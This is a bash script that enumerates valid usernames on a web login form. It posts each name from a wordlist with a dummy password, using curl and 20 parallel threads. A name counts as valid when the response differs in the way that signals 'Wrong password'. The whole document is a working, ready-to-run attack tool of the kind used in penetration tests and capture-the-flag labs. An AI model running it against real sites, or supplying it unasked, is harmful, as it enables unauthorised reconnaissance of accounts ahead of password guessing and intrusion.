#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
GRAY='\033[0;90m'
NC='\033[0m'

# Defaults
WORDLIST="/usr/share/seclists/Usernames/Names/names.txt"
THREADS="20"
URL=""
MATCH_STRING="Wrong password"

usage() {
    echo -e "Usage: $0 -u <url> [-w <wordlist>] [-m <match_string>]\n"
    echo -e "Options:"
    echo -e "  -u <url>           Target URL (required)"
    echo -e "  -w <wordlist>      Wordlist file (optional)"
    echo -e "  -m <match_string>  Response string that indicates a VALID username"
    echo -e "                     (default: \"Wrong password\")"
    echo -e "  -h                 Show this help message\n"
    exit 1
}

# Parse options
while getopts ":u:w:m:h" opt; do
    case "$opt" in
        u) URL="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        m) MATCH_STRING="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Require URL
[[ -z "$URL" ]] && usage

# Validate wordlist
[[ ! -f "$WORDLIST" ]] && echo "Error: $WORDLIST not found." && exit 1

TOTAL=$(grep -c . "$WORDLIST")

echo -e "${YELLOW}[*] Scanning $TOTAL usernames with $THREADS threads...${NC}"
echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

PIPE=$(mktemp -u)
mkfifo "$PIPE"

(
    COUNTER=0
    while IFS=: read -r status username; do
        ((COUNTER++))
        
        if [ "$status" = "FOUND" ]; then
            echo -ne "\r\033[2K"
            echo -e "${GREEN}[✓] Found: $username${NC}"
        fi
        
        echo -ne "\r${GRAY}[${COUNTER}/${TOTAL}] Testing: $username...${NC}"
    done < "$PIPE"
    
    echo -ne "\r\033[2K"
) &
DISPLAY_PID=$!

test_username() {
    local username="$1"
    local url="$2"
    local match="$3"
    
    response=$(curl -s -X POST "$url" -d "username=$username&password=test" 2>/dev/null)
    
    if echo "$response" | grep -q "$match" && ! echo "$response" | grep -q "Wrong username"; then
        echo "FOUND:$username"
    else
        echo "TESTED:$username"
    fi
}

export -f test_username

cat "$WORDLIST" | parallel -j "$THREADS" --line-buffer test_username {} "$URL" "$MATCH_STRING" > "$PIPE" 2>/dev/null

wait $DISPLAY_PID
rm -f "$PIPE"

echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${YELLOW}[*] Scan complete!${NC}"
